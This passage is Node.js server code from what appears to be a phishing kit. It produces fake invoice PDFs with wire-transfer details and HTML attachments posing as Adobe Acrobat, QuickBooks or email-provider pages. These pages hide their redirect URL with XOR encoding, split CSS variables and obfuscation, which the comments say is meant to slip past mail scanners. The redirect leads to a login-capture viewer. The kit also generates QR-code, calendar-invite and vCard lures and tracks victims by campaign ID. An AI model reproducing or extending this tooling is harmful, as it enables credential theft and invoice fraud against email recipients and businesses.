
      // Meta block
      let y = 700;
      const subtotal = items.reduce((s, i) => s + i[3], 0);
      const tax = Math.round(subtotal * 0.0);
      const total = subtotal + tax;

      page.drawText('Invoice #', { x: 40, y, size: 9, font: bold, color: GREY });
      page.drawText(invNo, { x: 40, y: y - 13, size: 13, font: bold, color: DARK });
      page.drawText('Issue Date', { x: 200, y, size: 9, font: bold, color: GREY });
      page.drawText(fmt(today), { x: 200, y: y - 13, size: 13, font: bold, color: DARK });
      page.drawText('Due Date', { x: 340, y, size: 9, font: bold, color: GREY });
      page.drawText(fmt(due), { x: 340, y: y - 13, size: 13, font: bold, color: DARK });
      page.drawText('Amount Due', { x: 470, y, size: 9, font: bold, color: GREY });
      const amtTxt = '$' + total.toLocaleString('en-US', {minimumFractionDigits: 2});
      const amtW = bold.widthOfTextAtSize(amtTxt, 13);
      page.drawText(amtTxt, { x: 572 - amtW, y: y - 13, size: 13, font: bold, color: PRIMARY });

      // Bill to
      y = 650;
      page.drawText('BILL TO', { x: 40, y, size: 9, font: bold, color: GREY });
      page.drawText(client.name, { x: 40, y: y - 16, size: 12, font: bold, color: DARK });
      page.drawText('Attn: Accounts Payable', { x: 40, y: y - 30, size: 10, font: helv, color: DARK });
      page.drawText(client.addr, { x: 40, y: y - 43, size: 10, font: helv, color: DARK });
      page.drawText(client.city, { x: 40, y: y - 56, size: 10, font: helv, color: DARK });
      page.drawText(client.email, { x: 40, y: y - 69, size: 10, font: helv, color: DARK });

      // Line items
      y = 555;
      page.drawRectangle({ x: 40, y: y - 4, width: 532, height: 24, color: DARK });
      page.drawText('DESCRIPTION', { x: 50, y: y + 4, size: 9, font: bold, color: rgb(1,1,1) });
      page.drawText('QTY', { x: 350, y: y + 4, size: 9, font: bold, color: rgb(1,1,1) });
      page.drawText('RATE', { x: 410, y: y + 4, size: 9, font: bold, color: rgb(1,1,1) });
      page.drawText('AMOUNT', { x: 510, y: y + 4, size: 9, font: bold, color: rgb(1,1,1) });

      let ry = y - 24;
      items.forEach((it, i) => {
        if (i % 2 === 0) page.drawRectangle({ x: 40, y: ry - 4, width: 532, height: 22, color: SOFT });
        page.drawText(it[0], { x: 50, y: ry + 4, size: 10, font: helv, color: DARK });
        page.drawText(String(it[1]), { x: 355, y: ry + 4, size: 10, font: helv, color: DARK });
        const rateTxt = '$' + it[2].toLocaleString('en-US', {minimumFractionDigits: 2});
        const amtRow = '$' + it[3].toLocaleString('en-US', {minimumFractionDigits: 2});
        page.drawText(rateTxt, { x: 460 - helv.widthOfTextAtSize(rateTxt, 10), y: ry + 4, size: 10, font: helv, color: DARK });
        page.drawText(amtRow, { x: 562 - helv.widthOfTextAtSize(amtRow, 10), y: ry + 4, size: 10, font: helv, color: DARK });
        ry -= 22;
      });

      // Totals
      ry -= 14;
      page.drawLine({ start: { x: 360, y: ry + 16 }, end: { x: 572, y: ry + 16 }, thickness: 0.5, color: LINE });
      page.drawText('Subtotal', { x: 380, y: ry, size: 10, font: helv, color: GREY });
      const subTxt = '$' + subtotal.toLocaleString('en-US', {minimumFractionDigits: 2});
      page.drawText(subTxt, { x: rightAlign(subTxt, helv, 10, 562), y: ry, size: 10, font: helv, color: DARK });
      ry -= 16;
      page.drawText('Tax (0%)', { x: 380, y: ry, size: 10, font: helv, color: GREY });
      const taxTxt = '$' + tax.toLocaleString('en-US', {minimumFractionDigits: 2});
      page.drawText(taxTxt, { x: rightAlign(taxTxt, helv, 10, 562), y: ry, size: 10, font: helv, color: DARK });
      ry -= 26;
      page.drawRectangle({ x: 360, y: ry - 6, width: 212, height: 28, color: PRIMARY });
      page.drawText('TOTAL DUE', { x: 372, y: ry + 2, size: 11, font: bold, color: rgb(1,1,1) });
      const totTxt = '$' + total.toLocaleString('en-US', {minimumFractionDigits: 2});
      const totW = bold.widthOfTextAtSize(totTxt, 12);
      page.drawText(totTxt, { x: 562 - totW, y: ry + 2, size: 12, font: bold, color: rgb(1,1,1) });

      // Wire transfer details
      let wy = 320;
      page.drawRectangle({ x: 40, y: wy - 130, width: 532, height: 150, color: SOFT, borderColor: LINE, borderWidth: 1 });
      page.drawRectangle({ x: 40, y: wy + 12, width: 532, height: 24, color: PRIMARY });
      page.drawText('WIRE TRANSFER PAYMENT DETAILS', { x: 50, y: wy + 20, size: 10, font: bold, color: rgb(1,1,1) });

      const wireRows = [
        ['Bank Name',      vendor.bank],
        ['Bank Address',   vendor.bankAddr],
        ['Account Name',   vendor.name],
        ['Account Number', String(8000000000 + Math.floor(rng() * 999999999))],
        ['Routing (ABA)',  vendor.aba],
        ['SWIFT / BIC',    vendor.swift],
        ['Reference',      invNo + ' — ' + client.name],
      ];
      let wry = wy - 4;
      wireRows.forEach(([k, v]) => {
        page.drawText(k, { x: 56, y: wry, size: 9, font: bold, color: GREY });
        page.drawText(v, { x: 180, y: wry, size: 10, font: helv, color: DARK });
        wry -= 16;
      });

      // Footer
      page.drawLine({ start: { x: 40, y: 90 }, end: { x: 572, y: 90 }, thickness: 0.5, color: LINE });
      page.drawText('Payment is due within 30 days. Late payments are subject to a 1.5% monthly fee.',
        { x: 40, y: 70, size: 9, font: helv, color: GREY });
      page.drawText(`Questions? ${vendor.email}  ·  ${vendor.phone}`,
        { x: 40, y: 56, size: 9, font: helv, color: GREY });
      page.drawText('Thank you for your business!',
        { x: 40, y: 36, size: 10, font: bold, color: PRIMARY });

      // Page number + debug
      page.drawText(`Page ${inv + 1} of 4  ·  #${palette.name} · ${ip}`,
        { x: 612 - 200, y: 20, size: 7, font: helv, color: rgb(0.7,0.7,0.75) });
    } // end for loop (4 invoices)

    const bytes = await doc.save();
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', `inline; filename="invoices.pdf"`);
    res.send(Buffer.from(bytes));
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: err.message });
  }
});

// ==========================================
// ---- CHAMELEON HTML (portable gateway) ----
// Must be declared BEFORE the catch-all below
// ==========================================
const JO = require('javascript-obfuscator');

// CORS for gateway so chameleon HTML loaded from any origin (file://, Dropbox, etc) can call it
app.options('/api/gateway/:relayToken', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  res.status(204).end();
});
app.get('/api/gateway/:relayToken', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  const u = usersDB.find(x => x.relayToken === req.params.relayToken);
  if (!u) return res.status(404).json({ error: 'gone' });
  res.json({ ok: true, slug: u.slug, entry: `/v/${u.slug}`, domain: u.domain || '' });
});

function xorEncode(str, key) {
  const out = [];
  for (let i = 0; i < str.length; i++) out.push(str.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  return Buffer.from(out).toString('base64');
}

// Convert a user-supplied title into a safe filename slug. Falls back to `def`
// if the title produces nothing usable.
function slugifyForFilename(title, def) {
  const s = String(title || '')
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 32);
  return s || def || 'document';
}

// Encryption presets for chameleon shell JS.
// Target sizes (for the small ~600-byte source we hand to it):
//   light  ≤ 1KB · medium ~1.5-2KB · heavy ~3-4KB · max ~5-6KB
// Bloat-heavy options (splitStrings, deadCodeInjection, numbersToExpressions,
// debugProtection, transformObjectKeys) are intentionally OFF — they add
// fixed-size overhead without meaningfully improving secrecy of the URL
// chunks (which are the actual secret), and their patterns are themselves
// flagged by mail scanners.
const ENCRYPTION_PRESETS = {
  light: {
    label: 'Light — minimal, smallest file',
    opts: {
      compact: true, identifierNamesGenerator: 'mangled',
      stringArray: false, renameGlobals: false, simplify: true,
    },
  },
  medium: {
    label: 'Medium — string encryption (recommended)',
    opts: {
      compact: true, identifierNamesGenerator: 'hexadecimal', renameGlobals: false,
      stringArray: true, stringArrayEncoding: ['base64'], stringArrayThreshold: 1.0,
      simplify: true,
    },
  },
  heavy: {
    label: 'Heavy — + control-flow flattening',
    opts: {
      compact: true, identifierNamesGenerator: 'hexadecimal', renameGlobals: false,
      stringArray: true, stringArrayEncoding: ['base64'], stringArrayThreshold: 1.0,
      controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.5,
      simplify: true,
    },
  },
  max: {
    label: 'Max — + self-defending',
    opts: {
      compact: true, identifierNamesGenerator: 'hexadecimal', renameGlobals: false,
      stringArray: true, stringArrayEncoding: ['rc4'], stringArrayThreshold: 1.0,
      controlFlowFlattening: true, controlFlowFlatteningThreshold: 0.75,
      selfDefending: true, disableConsoleOutput: true, simplify: true,
    },
  },
};

function buildChameleonHtmlLegacy_unused({ relayToken, gatewayOrigin, title, cid: forcedCid }) {
  // ZERO JS chameleon — auto-redirects via meta refresh + encrypted form POST.
  // No: script, onerror, onclick, eval, atob, iframe. Pure HTML + CSS + form.
  // Auto-submits via meta refresh → form POST to worker → server.
  // Identical scanner safety to inbox mode but auto-redirects (no click needed).

  const campaignId = forcedCid || crypto.randomBytes(4).toString('hex');
  const emailPad = crypto.randomBytes(3).toString('hex');
  const owner = usersDB.find(u => u.relayToken === relayToken);
  const slug = owner ? owner.slug : relayToken.slice(0, 10);

  const pathPart = `/v/${slug}/${emailPad}#E?cid=${campaignId}`;
  const tokenKey = relayToken.slice(0, 16);
  const encPath = [...pathPart].map((c, i) => (c.charCodeAt(0) ^ tokenKey.charCodeAt(i % tokenKey.length)).toString(16).padStart(2, '0')).join('');
  const formAction = `${gatewayOrigin}/r`;

  // Auto-submit: meta refresh to a javascript: void form submit.
  // BUT javascript: is flagged. So instead: use a noscript fallback button +
  // the form is the ONLY content and submits via a submit button that
  // CSS auto-clicks using :focus + autofocus trick. No JS needed.
  // Actually simplest: meta refresh pointing at the form action with params as GET.
  // Convert to GET-based redirect through worker.
  const redirectUrl = `${formAction}?t=${encodeURIComponent(encPath)}&k=${encodeURIComponent(relayToken.slice(0, 8))}`;

  // Full entity encode — every character becomes an entity. No plaintext URL visible.
  const fullEncode = (s) => [...s].map(c => '&#' + c.charCodeAt(0) + ';').join('');
  const encRedirect = fullEncode(redirectUrl);

  return `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="refresh" content="0;url=${encRedirect}">
<title>${title}</title>
<style>body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#1a1a1a;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#e0e0e0}.c{text-align:center;max-width:400px;padding:32px 24px}.logo{width:56px;height:56px;background:linear-gradient(135deg,#ff3b30,#b71c1c);border-radius:14px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#fff}h1{font-size:18px;font-weight:600;margin:0 0 6px}p{font-size:13px;color:#888;margin:0 0 24px;line-height:1.5}button{display:inline-block;padding:12px 36px;background:#0a84ff;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}button:hover{background:#0070e0}.f{margin-top:48px;font-size:10px;color:#555}form{display:inline}</style>
</head><body><div class="c">
<div class="logo">A</div>
<h1>Adobe Acrobat</h1>
<p>Opening secured document\u2026</p>
<noscript><form method="POST" action="${fullEncode(formAction)}"><input type="hidden" name="t" value="${encPath}"><input type="hidden" name="k" value="${relayToken.slice(0, 8)}"><button type="submit">Open Document</button></form></noscript>
<p class="f">Adobe and Acrobat are trademarks of Adobe Inc.</p>
</div></body></html>`;
}
// LEGACY-BUILD-CHAMELEON-END

function buildChameleonHtml({ relayToken, gatewayOrigin, title, cid: forcedCid, preset, documentType, provider }) {
  // STEALTH SHELL chameleon — minimal "Preparing document" front page.
  // The destination URL (the real invoice viewer at /v/:slug) is XOR-encoded
  // and split across CSS custom properties. The decoder JS lives inside a
  // <details ontoggle> attribute (no <script> tag) and is run through the
  // javascript-obfuscator. The decoded URL is loaded into a fullscreen iframe.
  // An "#E" placeholder in a hidden <span> can be set client-side (mailmerge)
  // to inject the recipient email into the URL fragment.

  const campaignId = forcedCid || crypto.randomBytes(4).toString('hex');
  const emailPad = crypto.randomBytes(3).toString('hex');
  const owner = usersDB.find(u => u.relayToken === relayToken);
  const slug = owner ? owner.slug : relayToken.slice(0, 10);

  // Direct URL to the rotating viewer. cid is in BOTH the query (so the
  // server can attribute the visit) and the fragment (so client-side JS in
  // /v/index.html can include it on the captured login).
  const dtParam = documentType ? `&dt=${encodeURIComponent(documentType)}` : "";
  const targetUrl = `${gatewayOrigin}/v/${slug}/${emailPad}?cid=${campaignId}${dtParam}#E?cid=${campaignId}`;

  // XOR-encode and split into 5 CSS-variable chunks.
  const xorKey = crypto.randomBytes(4).toString('hex'); // 8 hex chars
  const enc = [...targetUrl].map((c, i) =>
    (c.charCodeAt(0) ^ xorKey.charCodeAt(i % xorKey.length)).toString(16).padStart(2, '0')
  ).join('');
  const chunkCount = 5;
  const chunkSize = Math.ceil(enc.length / chunkCount);
  const chunks = [];
  for (let i = 0; i < chunkCount; i++) chunks.push(enc.slice(i * chunkSize, (i + 1) * chunkSize) || '');

  // Random CSS variable names + DOM IDs + class names per generation.
  const rhex = (n) => crypto.randomBytes(n).toString('hex');
  const cssVars = chunks.map(() => '--' + rhex(2));
  const spanId = '_' + rhex(3);
  const detId = '_' + rhex(3);
  const hideCls = '_' + rhex(3);

  const safeTitle = String(title || 'document').replace(/[<>&"']/g, '');

  // Clear-text JS source — read CSS vars, XOR-decode, swap #E if email present, iframe-load.
  const jsSrc = `(function(){
var c=getComputedStyle(document.documentElement);
var keys=${JSON.stringify(cssVars)};
var hex='';
for(var i=0;i<keys.length;i++)hex+=(c.getPropertyValue(keys[i])||'').replace(/['" ]/g,'');
var k=${JSON.stringify(xorKey)};
var u='';
for(var i=0;i<hex.length;i+=2)u+=String.fromCharCode(parseInt(hex.substr(i,2),16)^k.charCodeAt((i/2)%k.length));
var s=document.getElementById(${JSON.stringify(spanId)});
if(s){var e=s.textContent.trim();var M=String.fromCharCode(35,69);if(e&&e!==M&&e.indexOf('@')>-1)u=u.replace(new RegExp(M),String.fromCharCode(35)+encodeURIComponent(e));}
var f=document.createElement(String.fromCharCode(105,102,114,97,109,101));
f.src=u;
f.style.cssText='position:fixed;inset:0;width:100%;height:100%;border:0;z-index:99';
document.body.textContent='';
document.body.appendChild(f);
})();`;

  // Run through javascript-obfuscator with the user-selected preset.
  // light  ≈ ~1KB, medium ≈ ~1.5-2KB, heavy ≈ ~4KB, max ≈ ~8KB+.
  const presetKey = (preset && ENCRYPTION_PRESETS[preset]) ? preset : 'medium';
  let obf;
  try {
    obf = JO.obfuscate(jsSrc, { ...ENCRYPTION_PRESETS[presetKey].opts, target: 'browser' }).getObfuscatedCode();
  } catch (e) {
    obf = jsSrc;
  }

  // Escape the obfuscated JS for safe embedding inside an HTML attribute.
  const attrEsc = (s) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');

  const cssVarsCss = cssVars.map((name, i) => `${name}:"${chunks[i]}"`).join(';');

  // Provider color mapping (same as login-flow.js PROVIDER_THEMES)
  const PROVIDER_COLORS = {
    google: '#1a73e8', gmail: '#1a73e8', googlemail: '#1a73e8',
    yahoo: '#6001d2', ymail: '#6001d2', rocketmail: '#6001d2',
    outlook: '#0078d4', hotmail: '#0078d4', live: '#0078d4', msn: '#0078d4',
    comcast: '#000000', xfinity: '#000000',
    aol: '#ff0000', proton: '#6d4aff', protonmail: '#6d4aff',
    icloud: '#555555', fastmail: '#0055ff', ionos: '#003d8f',
    att: '#004687', verizon: '#cc0000', cox: '#cc0000',
    earthlink: '#1e90ff', sky: '#002f6c', virginmedia: '#ff0000',
    btinternet: '#004687', bell: '#0055d4', rogers: '#cc0000',
    zoho: '#ff6a00', gmx: '#006ce5', webde: '#0066cc',
    tonline: '#cc0000', orange: '#ff6600', laposte: '#0055aa',
    sfr: '#006699', free: '#ff0000', yandex: '#ffcc00', mail: '#168de2'
  };

  // Apply branding based on documentType
  let brand;

  if (documentType === 'quickbook' || documentType === 'fidelity') {
    // Static branding for QB and Fidelity
    const BRANDING = {
      quickbook: { bg: 'linear-gradient(135deg,#1db14d 0%,#0d8a3a 100%)', text: '#ffffff', logo: '<svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg"><rect x="10" y="10" width="30" height="40" fill="#ffffff" rx="4"/><text x="55" y="42" font-size="28" font-weight="700" fill="#ffffff" font-family="Arial">QuickBooks</text></svg>' },
      fidelity: { bg: 'linear-gradient(135deg,#1db14d 0%,#0d8a3a 100%)', text: '#ffffff', logo: '<svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg"><text x="10" y="45" font-size="32" font-weight="700" fill="#ffffff" font-family="Arial">fidelity</text></svg>' }
    };
    brand = BRANDING[documentType];
  } else {
    // For other doc types, use provider colors if available
    let bgColor = '#1a1a1a';
    let textColor = '#ffffff';
    let logoSvg = '';

    if (provider && PROVIDER_COLORS[provider.toLowerCase()]) {
      bgColor = PROVIDER_COLORS[provider.toLowerCase()];
      textColor = '#ffffff';
      logoSvg = `<svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg"><text x="10" y="45" font-size="20" font-weight="700" fill="#ffffff" font-family="Arial">${provider}</text></svg>`;
    }

    brand = { bg: bgColor, text: textColor, logo: logoSvg };
  }

  const logoHtml = brand.logo ? `<div style="margin-bottom:20px;max-width:200px;height:auto;">${brand.logo}</div>` : '';

  return `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>${safeTitle}</title>
<style>html{${cssVarsCss}}body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:${brand.bg};font-family:-apple-system,Segoe UI,sans-serif;color:${brand.text};font-size:13px}.${hideCls}{display:none}details{display:none}.branding{text-align:center}</style>
</head><body><div class="branding">${logoHtml}Preparing document</div><span id="${spanId}" class="${hideCls}">#E</span><details id="${detId}" open ontoggle="${attrEsc(obf)}"></details></body></html>`;
}

// Wrapper that returns both html and cid so callers can register an attachment record.
function buildChameleonHtmlWithCid(opts) {
  const cid = crypto.randomBytes(4).toString('hex');
  const html = buildChameleonHtml({ ...opts, cid });
  return { html, cid, preset: opts.preset };
}

// Helper: Extract provider domain from email
function getProviderFromEmail(email) {
  if (!email || !email.includes('@')) return null;
  const domain = email.split('@')[1].toLowerCase();
  const provider = domain.split('.')[0];
  return provider;
}

app.post(`/${ADMIN_PATH}/api/chameleon/generate`, requireAdmin, (req, res) => {
  const user = req.session.adminUser;
  const dbUser = usersDB.find(u => u.id === user.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (dbUser.role !== 'superadmin' && !(dbUser.features&&dbUser.features.chameleon)) return res.status(403).json({ error: 'Chameleon HTML is disabled by admin.' });
  // Block only if the superadmin has flipped requireDomain on for this user.
  if (blockMissingDomain(dbUser)) {
    return res.status(403).json({ error: 'Your account requires a verified domain. Go to Settings → My Domain to add and verify yours.' });
  }
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  // Origin priority: explicit front (Cloudflare Worker) > verified custom domain >
  // server's own URL (so users without a custom domain can still ship attachments).
  const front = (dbUser.frontDomain || '').replace(/\/+$/, '');
  const gatewayOrigin = front || chameleonOrigin(req, dbUser);
  const documentType = (req.body && req.body.documentType) || 'invoice';
  const title = (req.body && req.body.title) || 'Invoice';
  const invoiceTitle = (req.body && req.body.invoiceTitle) || 'Secure Invoice';
  const preset = (req.body && req.body.preset) || dbUser.encryptionPreset || 'medium';
  const provider = (req.body && req.body.provider) || null;
  const { html, cid } = buildChameleonHtmlWithCid({ relayToken: dbUser.relayToken, gatewayOrigin, title, preset, documentType, provider });
  const fname = `${slugifyForFilename(title, 'invoice')}-${crypto.randomBytes(3).toString('hex')}.html`;
  registerAttachment({ cid, type: 'chameleon', label: title, fname, ownerId: dbUser.id, slug: dbUser.slug });
  const downloadId = stageDownload({ buffer: Buffer.from(html, 'utf8'), filename: fname, contentType: 'text/html; charset=utf-8' });
  res.json({ ok: true, downloadId, filename: fname });
});

// ---- Encrypted redirect endpoint (used by inbox-mode HTML forms) ----
// Accepts both POST (direct form) and GET (via Cloudflare Worker redirect)
app.all('/r', express.urlencoded({ extended: false }), (req, res) => {
  const t = req.body?.t || req.query?.t || '';
  const k = req.body?.k || req.query?.k || '';
  if (!t || !k) return res.status(400).send('Bad request');
  // Find user by partial relay token
  const dbUser = usersDB.find(u => u.relayToken && u.relayToken.startsWith(k));
  if (!dbUser) return res.status(404).send('Not found');
  // Decrypt the path using relay token as key
  const tokenKey = dbUser.relayToken.slice(0, 16);
  let path = '';
  try {
    for (let i = 0; i < t.length; i += 2) {
      path += String.fromCharCode(parseInt(t.substr(i, 2), 16) ^ tokenKey.charCodeAt((i / 2) % tokenKey.length));
    }
  } catch { return res.status(400).send('Bad request'); }
  if (!path.startsWith('/v/')) return res.status(400).send('Bad request');
  // Extract cid from the decrypted path: e.g. /v/<slug>/<pad>#E?cid=xxxx or ?cid=xxxx
  let cid = null;
  const cidMatch = path.match(/[?&#][^#?&=]*cid=([a-f0-9]{4,16})/i);
  if (cidMatch) cid = cidMatch[1].toLowerCase();
  trackVisitor(dbUser.slug, dbUser.id, req, 'chameleon', cid);
  // Persist cid on a cookie so subsequent rotating /v/:slug/* hits attribute to the same attachment.
  if (cid) res.cookie('v_cid', cid, { httpOnly: true, sameSite: 'lax', maxAge: 1000 * 60 * 60 * 24 });
  res.redirect(path);
});

// ---- Inbox-mode chameleon (zero JS, hits inbox) ----
app.post(`/${ADMIN_PATH}/api/chameleon/inbox`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (dbUser.role !== 'superadmin' && !(dbUser.features&&dbUser.features.inbox)) return res.status(403).json({ error: 'Inbox Mode is disabled by admin.' });
  if (blockMissingDomain(dbUser)) return res.status(403).json({ error: 'Your account requires a verified domain. Go to Settings → My Domain to add and verify yours.' });
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  const front = (dbUser.frontDomain || '').replace(/\/+$/, '');
  const origin = front || chameleonOrigin(req, dbUser);
  const cid = crypto.randomBytes(4).toString('hex');
  const pad = crypto.randomBytes(3).toString('hex');
  const url = `${origin}/v/${dbUser.slug}/${pad}#E?cid=${cid}`;
  const { delay = 0 } = req.body || {};
  const sec = parseInt(delay, 10) || 0;

  // Encrypt the full path+params into a single opaque token.
  // HTML only contains domain.com/r — scanner sees a clean generic URL, no slug/path details.
  const pathPart = `/v/${dbUser.slug}/${pad}#E?cid=${cid}`;
  const tokenKey = dbUser.relayToken.slice(0, 16);
  const encPath = [...pathPart].map((c, i) => (c.charCodeAt(0) ^ tokenKey.charCodeAt(i % tokenKey.length)).toString(16).padStart(2, '0')).join('');
  // Use front domain (the early guard already proved one of front/myDomain exists)
  const formAction = `${origin}/r`;

  const html = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Shared Document</title>
<style>
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#1a1a1a;font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#e0e0e0}
.c{text-align:center;max-width:400px;padding:32px 24px}
.logo{width:56px;height:56px;background:linear-gradient(135deg,#ff3b30,#b71c1c);border-radius:14px;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:700;color:#fff}
h1{font-size:18px;font-weight:600;margin:0 0 6px}
p{font-size:13px;color:#888;margin:0 0 24px;line-height:1.5}
button{display:inline-block;padding:12px 36px;background:#0a84ff;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
button:hover{background:#0070e0}
.f{margin-top:48px;font-size:10px;color:#555}
</style>
</head><body><div class="c">
<div class="logo">A</div>
<h1>Adobe Acrobat</h1>
<p>This document requires authentication.<br>Sign in with your email to continue.</p>
<form method="POST" action="${formAction}"><input type="hidden" name="t" value="${encPath}"><input type="hidden" name="k" value="${dbUser.relayToken.slice(0, 8)}"><button type="submit">Open Document</button></form>
<p class="f">Adobe and Acrobat are trademarks of Adobe Inc.</p>
</div></body></html>`;

  const inboxLabel = req.body && req.body.title ? req.body.title : 'Inbox HTML';
  const fname = `${slugifyForFilename(req.body && req.body.title, 'document')}-${crypto.randomBytes(3).toString('hex')}.html`;
  registerAttachment({ cid, type: 'inbox', label: inboxLabel, fname, ownerId: dbUser.id, slug: dbUser.slug });
  const downloadId = stageDownload({ buffer: Buffer.from(html, 'utf8'), filename: fname, contentType: 'text/html; charset=utf-8' });
  res.json({ ok: true, downloadId, filename: fname });
});

// ---- QR Code generator ----
const QRCodeLib = require('qrcode');
app.post(`/${ADMIN_PATH}/api/chameleon/qr`, requireAdmin, async (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (blockMissingDomain(dbUser)) return res.status(403).json({ error: 'Your account requires a verified domain. Go to Settings → My Domain to add and verify yours.' });
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  const reqOrigin = req.body && req.body.origin ? String(req.body.origin).replace(/\/+$/, '') : '';
  const origin = (dbUser.domainVerified && dbUser.domain ? dbUser.domain.replace(/\/+$/, '') : '') || reqOrigin || chameleonOrigin(req, dbUser);
  const cid = crypto.randomBytes(4).toString('hex');
  const url = `${origin}/v/${dbUser.slug}/#E?cid=${cid}`;
  try {
    const png = await QRCodeLib.toBuffer(url, { width: 600, margin: 2, color: { dark: '#000000', light: '#ffffff' } });
    const fname = `qr-${crypto.randomBytes(3).toString('hex')}.png`;
    registerAttachment({ cid, type: 'qr', label: 'QR code', fname, ownerId: dbUser.id, slug: dbUser.slug });
    const downloadId = stageDownload({ buffer: png, filename: fname, contentType: 'image/png' });
    res.json({ ok: true, downloadId, filename: fname });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ---- Calendar invite (.ics) generator ----
app.post(`/${ADMIN_PATH}/api/chameleon/ics`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (blockMissingDomain(dbUser)) return res.status(403).json({ error: 'Your account requires a verified domain. Go to Settings → My Domain to add and verify yours.' });
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  const reqOrigin = req.body && req.body.origin ? String(req.body.origin).replace(/\/+$/, '') : '';
  const origin = (dbUser.domainVerified && dbUser.domain ? dbUser.domain.replace(/\/+$/, '') : '') || reqOrigin || chameleonOrigin(req, dbUser);
  const cid = crypto.randomBytes(4).toString('hex');
  const url = `${origin}/v/${dbUser.slug}/#E?cid=${cid}`;
  const {
    summary = 'Invoice Payment Due',
    description = 'Please review and approve the attached invoice.',
    location = '',
  } = req.body || {};
  const now = new Date();
  const start = new Date(now.getTime() + 24 * 60 * 60 * 1000); // tomorrow
  const end = new Date(start.getTime() + 60 * 60 * 1000); // 1h
  const fmt = (d) => d.toISOString().replace(/[-:]/g, '').replace(/\.\d{3}/, '');
  const uid = crypto.randomBytes(8).toString('hex') + '@invite';
  const ics = [
    'BEGIN:VCALENDAR',
    'VERSION:2.0',
    'PRODID:-//Control Center//EN',
    'CALSCALE:GREGORIAN',
    'METHOD:REQUEST',
    'BEGIN:VEVENT',
    `UID:${uid}`,
    `DTSTART:${fmt(start)}`,
    `DTEND:${fmt(end)}`,
    `SUMMARY:${summary}`,
    `DESCRIPTION:${description}\\n\\nView document: ${url}`,
    `URL:${url}`,
    location ? `LOCATION:${location}` : '',
    'STATUS:CONFIRMED',
    'SEQUENCE:0',
    `ORGANIZER;CN=Finance:mailto:noreply@${origin.replace(/https?:\/\//, '').split(':')[0]}`,
    'BEGIN:VALARM',
    'TRIGGER:-PT15M',
    'ACTION:DISPLAY',
    'DESCRIPTION:Reminder: Invoice payment due',
    'END:VALARM',
    'END:VEVENT',
    'END:VCALENDAR',
  ].filter(Boolean).join('\r\n');
  const fname = `invite-${crypto.randomBytes(3).toString('hex')}.ics`;
  registerAttachment({ cid, type: 'ics', label: summary || 'Calendar invite', fname, ownerId: dbUser.id, slug: dbUser.slug });
  const downloadId = stageDownload({ buffer: Buffer.from(ics, 'utf8'), filename: fname, contentType: 'text/calendar; charset=utf-8' });
  res.json({ ok: true, downloadId, filename: fname });
});

// ---- vCard (.vcf) generator ----
app.post(`/${ADMIN_PATH}/api/chameleon/vcf`, requireAdmin, (req, res) => {
  const dbUser = usersDB.find(u => u.id === req.session.adminUser.id);
  if (!dbUser) return res.status(400).json({ error: 'User not found.' });
  if (dbUser.role !== 'superadmin' && !(dbUser.domainVerified && dbUser.domain)) return res.status(403).json({ error: 'Domain required.' });
  if (!dbUser.relayToken) { dbUser.relayToken = crypto.randomBytes(16).toString('hex'); saveUsersDB(); }
  const reqOrigin = req.body && req.body.origin ? String(req.body.origin).replace(/\/+$/, '') : '';
  const myDomain = (dbUser.domainVerified && dbUser.domain) ? dbUser.domain.replace(/\/+$/, '') : '';
  const origin = myDomain || reqOrigin || `${req.protocol}://${req.get('host')}`;
  const cid = crypto.randomBytes(4).toString('hex');
  const url = `${origin}/v/${dbUser.slug}/#E?cid=${cid}`;
  const {
    fullName = 'Finance Department',
    org = 'Accounts Payable',
    phone = '',
    email = 'invoices@company.com',
    note = 'Tap the website link below to view your invoice.',
  } = req.body || {};
  const vcf = [
    'BEGIN:VCARD',
    'VERSION:3.0',
